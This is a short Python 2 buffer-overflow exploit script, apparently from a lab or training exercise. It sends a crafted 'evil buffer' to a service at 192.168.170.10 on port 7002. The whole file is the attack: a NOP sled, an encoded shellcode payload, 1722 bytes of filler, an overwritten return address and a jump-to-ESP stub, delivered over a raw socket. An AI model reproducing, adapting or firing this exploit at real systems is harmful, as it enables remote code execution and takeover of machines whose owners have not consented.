#!/usr/bin/python
import socket
try:
  print "\nSending evil buffer..."
  nops = "\x90" * 10
  shellcode = (
"\x33\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e"
"\x67\x2b\x65\xf5\x83\xee\xfc\xe2\xf4\x9b\xc3\xe7\xf5\x67\x2b"
"\x05\x7c\x82\x1a\xa5\x91\xec\x7b\x55\x7e\x35\x27\xee\xa7\x73"
"\xa0\x17\xdd\x68\x9c\x2f\xd3\x56\xd4\xc9\xc9\x06\x57\x67\xd9"
"\x47\xea\xaa\xf8\x66\xec\x87\x07\x35\x7c\xee\xa7\x77\xa0\x2f"
"\xc9\xec\x67\x74\x8d\x84\x63\x64\x24\x36\xa0\x3c\xd5\x66\xf8"
"\xee\xbc\x7f\xc8\x5f\xbc\xec\x1f\xee\xf4\xb1\x1a\x9a\x59\xa6"
"\xe4\x68\xf4\xa0\x13\x85\x80\x91\x28\x18\x0d\x5c\x56\x41\x80"
"\x83\x73\xee\xad\x43\x2a\xb6\x93\xec\x27\x2e\x7e\x3f\x37\x64"
"\x26\xec\x2f\xee\xf4\xb7\xa2\x21\xd1\x43\x70\x3e\x94\x3e\x71"
"\x34\x0a\x87\x74\x3a\xaf\xec\x39\x8e\x78\x3a\x43\x56\xc7\x67"
"\x2b\x0d\x82\x14\x19\x3a\xa1\x0f\x67\x12\xd3\x60\xd4\xb0\x4d"
"\xf7\x2a\x65\xf5\x4e\xef\x31\xa5\x0f\x02\xe5\x9e\x67\xd4\xb0"
"\xa5\x37\x7b\x35\xb5\x37\x6b\x35\x9d\x8d\x24\xba\x15\x98\xfe"
"\xf2\x9f\x62\x43\xa5\x5d\x10\x81\x0d\xf7\x67\x2a\xde\x7c\x81"
"\x41\x75\xa3\x30\x43\xfc\x50\x13\x4a\x9a\x20\xe2\xeb\x11\xf9"
"\x98\x65\x6d\x80\x8b\x43\x95\x40\xc5\x7d\x9a\x20\x0f\x48\x08"
"\x91\x67\xa2\x86\xa2\x30\x7c\x54\x03\x0d\x39\x3c\xa3\x85\xd6"
"\x03\x32\x23\x0f\x59\xf4\x66\xa6\x21\xd1\x77\xed\x65\xb1\x33"
"\x7b\x33\xa3\x31\x6d\x33\xbb\x31\x7d\x36\xa3\x0f\x52\xa9\xca"
"\xe1\xd4\xb0\x7c\x87\x65\x33\xb3\x98\x1b\x0d\xfd\xe0\x36\x05"
"\x0a\xb2\x90\x95\x40\xc5\x7d\x0d\x53\xf2\x96\xf8\x0a\xb2\x17"
"\x63\x89\x6d\xab\x9e\x15\x12\x2e\xde\xb2\x74\x59\x0a\x9f\x67"
"\x78\x9a\x20")
  filler = "A" * 1722
  eip = "\x3d\x11\x80\x14"
  esp = "\xff\xe1\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
  buffer = nops + shellcode + filler + eip + esp
  s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
  s.connect(("192.168.170.10", 7002))
  s.send(buffer)
  s.close()
  print "\nDone!"
except:
  print "\nCould not connect!"
